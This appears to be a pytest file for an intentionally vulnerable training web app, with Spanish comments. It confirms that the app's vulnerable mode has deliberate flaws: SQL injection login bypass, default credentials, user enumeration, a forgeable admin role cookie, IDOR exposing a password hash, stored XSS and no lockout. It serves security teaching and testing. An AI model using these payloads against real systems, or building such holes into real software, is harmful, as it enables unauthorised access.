"""Estos tests comprueban que las fallas del modo vulnerable EXISTEN (para que la guía funcione)."""
import pytest

from conftest import login, register


@pytest.fixture
def client(make_app):
    return make_app("vulnerable").test_client()


def test_sql_injection_bypasses_login(client):
    assert login(client, "admin' --", "cualquiera").status_code == 302
    assert client.get("/clima").status_code == 200


def test_default_credentials(client):
    assert login(client, "admin", "admin123").status_code == 302


def test_user_enumeration(client):
    assert "no existe" in login(client, "nadie", "x").get_data(as_text=True)
    assert "contraseña incorrecta" in login(client, "admin", "x").get_data(as_text=True)


def test_role_cookie_grants_admin(client):
    login(client, "maria", "princesa")
    assert client.get("/admin").status_code == 403
    client.set_cookie("role", "admin")
    assert client.get("/admin").status_code == 200


def test_idor_shows_other_users_hash(client):
    login(client, "maria", "princesa")
    html = client.get("/perfil/1").get_data(as_text=True)
    assert "0192023a7bbd73250516f069df18b500" in html  # md5("admin123")


def test_stored_xss(client):
    register(client, "<script>alert(1)</script>", "x")
    login(client, "<script>alert(1)</script>", "x")
    assert "<script>alert(1)</script>" in client.get("/clima").get_data(as_text=True)


def test_no_lockout(client):
    for _ in range(20):
        login(client, "maria", "mala")
    assert login(client, "maria", "princesa").status_code == 302
